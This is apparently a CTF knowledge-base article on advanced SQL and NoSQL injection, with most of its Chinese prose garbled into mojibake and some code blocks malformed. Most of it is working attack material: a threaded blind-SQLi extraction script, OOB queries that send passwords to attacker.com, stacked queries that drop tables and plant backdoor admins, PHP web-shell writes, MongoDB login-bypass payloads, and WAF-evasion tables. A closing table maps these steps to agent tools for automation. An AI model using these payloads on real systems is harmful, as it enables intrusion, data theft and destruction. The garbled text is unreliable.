---
id: 'ctf-website/03-injection/sqli-nosqli'
title: 'SQLi & NoSQLi (鏁版嵁搴撴敞鍏ラ珮闃跺疄鎴?'
title_en: 'Advanced SQLi and NoSQLi Injection'
summary: >
  楂橀樁鏁版嵁搴撴敞鍏ュ疄鎴樻寚鍗楋紝娑电洊 SQLi WAF 缁曡繃鎶€宸э紙鍙屽啓銆佸瀛楄妭銆佹敞閲婃浛浠ｏ級銆佹棤鍥炴樉鐩叉敞骞跺彂鐖嗙牬銆丯oSQL 娉ㄥ叆锛圡ongoDB $regex/$ne 鍒╃敤锛夈€丱OB 鏁版嵁澶栧甫銆佷簩娆℃敞鍏ャ€佸爢鍙犳煡璇㈠強澶氭暟鎹簱涓撳睘鎶€宸с€傚寘鍚?Cloud WAF 涓撻」缁曡繃绛栫暐銆?
summary_en: >
  An advanced guide to database injection covering SQLi WAF bypass techniques (double-writing, wide-byte, comment substitution), blind injection with concurrent brute-forcing, NoSQL injection (MongoDB $regex/$ne exploitation), OOB data exfiltration, second-order injection, stacked queries, and database-specific techniques. Includes Cloud WAF bypass strategies.
board: 'ctf-website'
category: '03-injection'
signals: ['SQLi', 'NoSQLi', 'WAF bypass', '鐩叉敞', 'MongoDB', '$regex', 'OOB', '瀹藉瓧鑺?]
mcp_tools: ['http_probe', 'run_ctf_tool', 'kb_router']
keywords: ['SQL娉ㄥ叆', 'NoSQL娉ㄥ叆', 'MongoDB娉ㄥ叆', 'WAF缁曡繃', '鐩叉敞', 'OOB', 'sqlmap', '$regex']
difficulty: 'advanced'
tags: ['injection', 'sqli', 'nosqli', 'waf-bypass', 'database', 'web-security', 'ctf']
language: 'zh-CN'
last_updated: '2026-06-25'
related_articles: []
---

# SQLi & NoSQLi (鏁版嵁搴撴敞鍏ラ珮闃跺疄鎴?

鏁版嵁搴撴敞鍏ユ槸 Web 瀹夊叏涓殑缁忓吀闂锛屼絾鍦?CTF 鍜岀幇浠?Web 瀵规姉涓紝鎴戜滑閫氬父闇€瑕侀潰瀵?*闃叉敞鍏ヨ繃婊?(WAF)**銆?*鏃犲洖鏄剧洸娉?*浠ュ強 **NoSQL锛堝 MongoDB锛?* 鏋舵瀯銆傛湰鎸囧崡渚ч噸浜庨珮闃跺埄鐢ㄤ笌 Bypass 绛栫暐銆?

---

## 1. SQL 娉ㄥ叆楂樼骇 Bypass 鎶€宸?

鍦ㄩ潰涓?WAF 杩囨护鏃讹紝甯歌鐨?`UNION SELECT` 浼氳鐩存帴鎷︽埅锛屽繀椤婚噰鐢ㄥ彉褰笌鐗瑰畾鏁版嵁搴撶壒鎬х粫杩囥€?

### A. 鍏抽敭瀛楄繃婊ょ粫杩?

- **鍙屽啓缁曡繃**锛堣嫢杩囨护鍣ㄥ彧杩涜涓€娆℃鍒欑┖鏇挎崲锛夛細 `UNIunionON SELselectECT` -> 鏇挎崲鎺夊唴閮ㄧ殑灏忓啓鍚庯紝澶栦晶閲嶆柊鎷兼帴鎴?`UNION SELECT`銆?- **澶у皬鍐欏彉绉嶄笌娣锋穯**锛?鍦ㄦ煇浜涢厤缃笉褰撶殑鏃?WAF 涓€傜敤锛歚UnIoN SeLeCt`銆?- **绉戝璁℃暟娉曚笌鐗规畩鏁板€肩粫杩?*锛堥拡瀵规暟瀛楀瀷娉ㄥ叆妫€娴嬶級锛?浣跨敤 `1e0` 浠ｆ浛 `1`锛屾垨 `1.0`锛宍1.0e0`銆?- **娉ㄩ噴绗︽浛浠ｇ┖鏍?*锛?鍒╃敤澶氳娉ㄩ噴 `/**/` 鎴栨槸 `%09`, `%0a`, `%0d`, `%a0` (鍦ㄤ笉鍚屾搷浣滅郴缁?瀹瑰櫒涓嬭兘瑙ｆ瀽涓虹┖鏍? 鏇夸唬琚?WAF 杩囨护鐨勭┖鏍笺€?
### B. 绗﹀彿杩囨护缁曡繃

- **閫楀彿杩囨护缁曡繃**锛?- 鍦?`LIMIT` 涓細`LIMIT 1 OFFSET 0` 鏇夸唬 `LIMIT 0,1`銆?- 鍦?`SUBSTR` 鎴?`MID` 涓細`SUBSTR(password FROM 1 FOR 1)` 鏇夸唬 `SUBSTR(password, 1, 1)`銆?- 鍦?`join` 缁撴瀯涓埄鐢?`UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b` 鏇夸唬甯歌澶氬垪銆?- **绛夊彿杩囨护缁曡繃**锛?浣跨敤 `LIKE`銆乣REGEXP`銆乣IN`銆乣>`銆乣<` 鎴?`IS NOT NULL` 鏇夸唬 `=`銆?
### C. 瀹藉瓧鑺傛敞鍏?(Wide Byte Injection)

褰撳悗绔娇鐢?`addslashes` 鎴栭瓟鏈紩鍙凤紝瀵规垜浠殑 `'` 鑷姩杞箟涓?`\'`锛堝嵆娣诲姞 `%5c`锛夛細

- **鍘熺悊**锛氬鏋滄暟鎹簱浣跨敤 `GBK` 鎴栫被浼肩殑澶氬瓧鑺傜紪鐮侊紝鎴戜滑杈撳叆 `%df%27`銆?- **杩囩▼**锛氳浆涔夊悗鍙樹负 `%df%5c%27`銆傝€屽湪 GBK 缂栫爜涓紝`%df%5c` 浼氳绯荤粺璇嗗埆涓轰竴涓姹夊瓧锛堚€滈亱鈥濓級锛屼粠鑰屾垚鍔熸妸杞箟绗?`%5c` 鍚冩帀锛屼娇鍗曞紩鍙?`%27` 閫冮€搁棴鍚堛€?
---

## 2. 鏃犲洖鏄剧洸娉紙Blind SQLi锛夊苟鍙戠垎鐮?

瀵逛簬甯冨皵鐩叉敞 (Boolean-based) 鎴栨椂闂寸洸娉?(Time-based)锛屽崟绾跨▼鐖嗙牬閫熷害鎱笖鏋佹槗瓒呮椂銆傛湰鎸囧崡寤鸿鍦?`scripts/` 涓嬬紪鍐?Python 鐩叉敞鑴氭湰鏃讹紝浣跨敤澶氱嚎绋嬫彁閫熴€?

### 浜屽垎娉曞苟鍙戠垎鐮存牳蹇冧唬鐮?

```python
import concurrent.futures
import requests

URL = "http://target-domain/api.php?id="
# 甯冨皵鐩叉敞鍒ゆ柇锛氬綋鍝嶅簲涓寘鍚?"welcome" 鏃朵负鐪?

def check_char_at_pos(pos, mid):
    # 浣跨敤 LIMIT FROM 閬垮紑閫楀彿锛岀敤 LIKE 閬垮紑绛夊彿
    payload = f"1 AND ASCII(SUBSTR((SELECT flag FROM flags) FROM {pos} FOR 1)) > {mid}"
    resp = requests.get(URL + payload)
    return "welcome" in resp.text

def get_char_for_pos(pos):
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        if check_char_at_pos(pos, mid):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)

# 骞跺彂鑾峰彇 flag (鍋囪闀垮害涓?40)
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    results = executor.map(get_char_for_pos, range(1, 41))
    flag = "".join(results)
    print(f"Flag extracted: {flag}")
```

---

## 3. NoSQL 娉ㄥ叆 (MongoDB 鍒╃敤)

MongoDB 鎺ュ彈 JSON 鎴?Query-string 绫诲瀷鐨勫璞℃煡璇紝杩欎細瀵艰嚧绫讳技 SQLi 鐨勯€昏緫娉ㄥ叆銆?

### A. 閫昏緫缁曡繃 (Authentication Bypass)

濡傛灉鐧诲綍鎺ュ彛鐨勬帴鏀跺瓧娈垫湭琚繃婊わ細

- **Payload (JSON)**锛?```json { "username": { "$ne": "guest" }, "password": { "$gt": "" } } ``` `$ne` (Not Equal) 鍜?`$gt` (Greater Than) 浼氬鑷?MongoDB 鏌ヨ鏉′欢鈥滅敤鎴峰悕涓嶇瓑浜?guest 涓斿瘑鐮侀暱搴﹀ぇ浜庣┖鈥濇亽鎴愮珛锛屼粠鑰屽疄鐜版棤瀵嗙爜鐧诲綍銆?
### B. 姝ｅ垯鍖归厤鐩叉敞 (Data Extraction)

鍒╃敤 `$regex` 榄旀湳鎿嶄綔绗﹂€愭鐖嗙牬鏁版嵁搴撳瓧娈靛€硷細

- **鎺㈡祴 Payload**锛?```json { "username": "admin", "password": { "$regex": "^f" } } ``` 濡傛灉鏈嶅姟鍣ㄨ繑鍥炵櫥褰曟垚鍔燂紝璇存槑 admin 鐨勫瘑鐮佷互 `f` 寮€澶淬€傚彲閫氳繃鑴氭湰寰幆 `^fa`, `^fb`... 閫掑綊鎻愬彇鍑哄畬鏁寸殑瀵嗙爜銆?- **闃茶寖娉ㄦ剰**锛氬湪姝ｅ垯鐖嗙牬鏃讹紝濡傛灉瀵嗙爜涓寘鍚?`.`, `*`, `+`, `?` 绛夋鍒欐帶鍒跺瓧绗︼紝璁板緱鍦ㄥ彂鍖呭墠浣跨敤 `re.escape()` 鎴栨槸瀛楃杞箟澶勭悊銆?
---

## 4. Out-of-Band SQLi (OOB) 鈥?鏃犲洖鏄炬椂鏁版嵁澶栧甫

```sql
-- ============ MySQL ============
-- 闇€瑕?secure_file_priv 涓虹┖
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\a'));
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 0,1),'.attacker.com\\a'));

-- ============ PostgreSQL ============
DROP TABLE IF EXISTS oob; CREATE TABLE oob(t TEXT);
COPY oob FROM PROGRAM 'nslookup $(whoami).attacker.com';

-- ============ MSSQL ============
EXEC master.dbo.xp_dirtree '\\\\attacker.com\\share';
DECLARE @a VARCHAR(8000); SELECT @a=DB_NAME();
EXEC master.dbo.xp_dirtree '\\\\'+@a+'.attacker.com\\';

-- ============ Oracle ============
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM DUAL;
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM=1)||'.attacker.com') FROM DUAL;
```

```python
# OOB Listener 鈥?鎺ユ敹 DNS/HTTP callback
# 鍚姩: python3 oob_listener.py
from http.server import HTTPServer, BaseHTTPRequestHandler
import re

class OOBHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # 浠?path 鎻愬彇鏁版嵁
        match = re.search(r'/([a-f0-9]{32,})', self.path)
        if match: print(f"[+] Data: {match.group(1)}")
        self.send_response(204)
    def log_message(self, *args): pass  # 闈欓粯

HTTPServer(('0.0.0.0', 80), OOBHandler).serve_forever()
```

---

## 5. Second-Order SQLi (浜屾娉ㄥ叆)

```python
# 鏀诲嚮妯″瀷:
# Step 1: payload 鍏堝瓨鍏ユ暟鎹簱锛堟敞鍐岀敤鎴峰悕/email/涓汉绠€浠嬶級
# Step 2: 鍚庣画涓氬姟鐢ㄨ繖涓剰鏁版嵁鎷兼帴 SQL

SECOND_ORDER_PAYLOADS = {
    "profile_name": "admin' AND 1=1 --",
    "email": "test' OR pg_sleep(5) OR '1'='1",
    "comment": "x'; WAITFOR DELAY '00:00:05'; --",
}

# 鎺㈡祴鎬濊矾:
# 1. 鍦ㄦ墍鏈夋枃鏈緭鍏ョ偣妞嶅叆鍚勬暟鎹簱鐨?sleep payload
# 2. 瑙傚療鍝簺鍚庣画椤甸潰鍔犺浇鍙樻參
# 3. 鍙樻參鐨勯〉闈?鈫?绗簩娆℃煡璇㈢敤鍒颁簡浣犵殑 dirty data
```

---

## 6. Stacked Queries (澶氳鍙?

```sql
'; DROP TABLE users;--
'; INSERT INTO users VALUES('backdoor','hash');--
'; CREATE TABLE shell(data TEXT); LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE shell;--
'; UPDATE users SET role='admin' WHERE username='attacker';--
```

---

## 7. DB 鐗规湁鎶€宸?

```sql
-- PostgreSQL
CREATE TABLE tmp(t TEXT); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp;
COPY (SELECT '<?php system($_GET[c]);?>') TO '/var/www/shell.php';
SELECT dblink_connect('host=127.0.0.1 port=6379');  -- SSRF

-- SQLite
SELECT sql FROM sqlite_master WHERE type='table';  -- 鏃?information_schema
ATTACH DATABASE '/var/www/shell.php' AS s; CREATE TABLE s.x(t TEXT); INSERT INTO s.x VALUES('<?php ?>');

-- Oracle
SELECT extractvalue(xmltype('<!--'),'/') FROM dual;  -- 鎶ラ敊娉ㄥ嚭
SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) END FROM DUAL;  -- 鏃堕棿鐩叉敞
```

---

## 8. NoSQL 澧炲己锛氭搷浣滅鍏ㄩ泦 + 宓屽缁曡繃

```python
# MongoDB 瀹屾暣鎿嶄綔绗﹀瓧鍏?
MONGO_OPS = {
    "$ne": "", "$gt": "", "$gte": "", "$lt": "", "$lte": "",
    "$in": ["admin"], "$nin": ["guest"],
    "$regex": "^a",            # 閫愬瓧绗︾垎鐮?
    "$where": "sleep(5000)",   # JS 鎵ц (鏃х増)
    "$exists": True,           # 鎺㈡祴瀛楁
    "$type": 2,                # 瀛楁绫诲瀷 (2=String)
}

# 宓屽缁曡繃 (杩囨护鍣ㄥ彧妫€鏌ラ《灞?key)
{"user": {"$gt": ""}, "password": {"$gt": ""}}

# $where JS 娉ㄥ叆
{"$where": "this.role=='admin'"}
{"$where": "this.constructor.constructor('return process')()"}
```

---

## 9. WAF Bypass 鍏ㄨ〃

```python
# 绌烘牸鏇夸唬
["/**/", "%09", "%0a", "%0d", "%0b", "%0c", "%a0", "%00"]

# 鍏抽敭瀛楁贩娣?
SELECT 鈫?SeLeCt, SEL/**/ECT, %53%45%4c%45%43%54, SE{LECT (MySQL)

# 绛夊彿鏇夸唬
= 鈫?LIKE, REGEXP, BETWEEN, IN, >, <, IS NOT NULL, SOUNDS LIKE

# 娉ㄩ噴
-- , #, /**/, ;%00, --%20%2b

# 閫楀彿鏇夸唬
SUBSTR(col FROM 1 FOR 1) 鏇夸唬 SUBSTR(col,1,1)
LIMIT 1 OFFSET 0         鏇夸唬 LIMIT 0,1
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b  鏇夸唬 UNION SELECT 1,2
```

### Cloud WAF 涓撻」缁曡繃

```python
# Cloudflare: 閫氬父涓嶆嫤绾?SQL 鍏抽敭瀛楃粍鍚?
# 缁曡繃鍏抽敭: 閬垮紑 SQL 娉ㄥ叆妫€娴嬬壒寰?(function(args))
# Cloudflare 妫€鏌? sleep(, benchmark(, substr(, ascii(
# 鏇夸唬鍝?
#   SLEEP(N)       鈫?GET_LOCK('a', N), 閲嶅璁＄畻 BOMB()
#   SUBSTR(a,1,1)  鈫?MID(a,1,1) / LEFT(a,1) / RIGHT(a,1)
#   ASCII()        鈫?ORD()

# AWS WAF: SQL injection rule 妫€鏌ュ叧閿瘝鎺掑垪
# 缁曡繃: 鍐呰仈娉ㄩ噴 /*!50000SELECT*/ (MySQL鐗堟湰娉ㄩ噴)

# ModSecurity:
# 缁曡繃: 鍒嗘浼犺緭 encoding 宸紓
#   Content-Type: multipart/form-data + charset=ibm500 (EBCDIC缂栫爜)
```

```bash
# sqlmap WAF 缁曡繃 鈥?tamper 閾?
sqlmap -u "..." --tamper="space2comment,charencode,percentage,randomcase,equaltolike" --technique=BEU --dbs
```

---

## 10. 鏀诲嚮閾?

````
SQLi 鈫掕鐢ㄦ埛琛?鈫?绠＄悊鍛樺瘑鐮?hash 鈫?crack 鈫?绠＄悊鍚庡彴鐧诲綍
SQLi 鈫?璇婚厤缃枃浠?(LOAD_FILE) 鈫?DB 瀵嗙爜 鈫?鍐呯綉妯悜
SQLi 鈫?UDF/OUTFILE 鈫?鍐?webshell 鈫?RCE
SQLi 鈫?stacked query 鈫?INSERT 鍚庨棬绠＄悊鍛?鈫?鎸佷箙鍖?
SQLi 鈫?OOB DNS 鈫?閫愬瓧鑺傚甯?flag 鈫?鏃犲洖鏄惧畬鎴?
NoSQLi $regex 鈫?閫愬瓧绗︾垎鐮?JWT secret 鈫?JWT 浼€?鈫?Admin API
SQLi 鈫?INFORMATION_SCHEMA 鈫?鍙戠幇鍏朵粬搴旂敤 DB 鈫?璺ㄥ簱鏀诲嚮

## 11. Content-Type Smuggling for SQLi (WAFFLED)

```python
# WAFFLED-style: 淇敼 Content-Type 鈫?WAF 鎸?form 瑙ｆ瀽 (浣庝紭鍏堢骇妫€鏌?
# 鈫?浣嗗悗绔寜 JSON/XML 瑙ｆ瀽 鈫?娉ㄥ叆閫氳繃

SMUGGLE_HEADERS = {
 "Content-Type": [ "application/json; charset=utf-8",     # 鏍囧噯 JSON "application/x-www-form-urlencoded",    # WAF form check "multipart/form-data; boundary=x",      # WAF 璁や负 multipart "text/plain; charset=utf-8",            # WAF 蹇界暐 "application/xml",                      # 鍚庣鍙兘瑙ｆ瀽涓?JSON ] }

def content_type_smuggling_sqli(target: str, sqli_payload: str):
 """娴嬭瘯涓嶅悓 Content-Type 涓嬬殑 SQLi 鏄惁琚?WAF 鎷︽埅""" for ct in SMUGGLE_HEADERS["Content-Type"]: r = requests.post(target, data=sqli_payload, headers={"Content-Type": ct}) if r.status_code not in (403, 406): print(f"  {ct}: {r.status_code}")
````

## 12. Polyglot SQLi Payloads

```sql
-- 涓€涓?payload, 鍦ㄥ绉?SQL 鏂硅█涓兘鏈夋晥
 -- MySQL + PostgreSQL + MSSQL 閫氱敤: 1'/**/OR/**/1=1/**/-- 1' UNION SELECT 1,2,3 FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c -- 0'XOR(if(now()=sysdate(),sleep(5),0))XOR'  -- MySQL SLEEP + 鍏朵粬 DB 鏃犲

-- HTML + SQL polyglot (閫氳繃杈撳叆鍚屾椂瑙﹀彂 XSS 鍜?SQLi):
 '><img src=x onerror=alert(1)>' OR '1'='1
```

## 13. Session Splicing (缁曡繃寮傚父璇勫垎 WAF)

```python
# 鎶婃敾鍑?payload 鎷嗗埌澶氫釜璇锋眰涓?鈫?WAF 鐪嬩笉鍒板畬鏁存敾鍑?
# 璇锋眰 1: 1' UNION SEL
# 璇锋眰 2: ECT 1,2,3 FR
# 璇锋眰 3: OM users --
# 鈫?鏌愪簺鍚庣鎷兼帴璇锋眰 鈫?褰㈡垚瀹屾暣娉ㄥ叆

def session_splice(requests_parts: list[str]):
 """鐢ㄤ笉鍚?session 鍒嗘鍙戦€?SQL 鍏抽敭瀛?"" for part in requests_parts:
        # 姣忎釜 part 鐢ㄤ笉鍚?session 鈫?WAF 鐙珛璇勫垎 鈫?閮戒綆鍒嗘斁杩?
        session = requests.Session()
 session.post(target, data={"q": part})
```

```

## Evidence

璁板綍: 鐪熷亣鍝嶅簲瀵?(甯冨皵鐩叉敞)銆佸揩鎱㈡椂闂村 (鏃堕棿鐩叉敞)銆丱OB DNS/HTTP 鏃ュ織銆丼econd-order 涓ゆ request/response

## MCP 宸ュ叿鏄犲皠

AI Agent 鍙皟鐢ㄤ互涓?MCP 宸ュ叿鑷姩瀹屾垚鎴栧姞閫熶笂杩版敾鍑绘楠わ細

| 鏀诲嚮姝ラ | MCP 宸ュ叿 | 璇存槑 |
|---------|---------|------|
| 鎺㈡祴娉ㄥ叆鐐?| `http_probe` | HTTP GET 鎺㈡祴鍙傛暟 |
| SQL 娉ㄥ叆鑷姩鍖?| `run_ctf_tool sqlmap --args "--batch --dbs"` | 鑷姩妫€娴?鍒╃敤 SQLi |
| 鎸変俊鍙锋煡鎶€鏈?| `kb_router` | 鎼滅储 sqli 鐩稿叧鎶€鏈枃浠?|

```
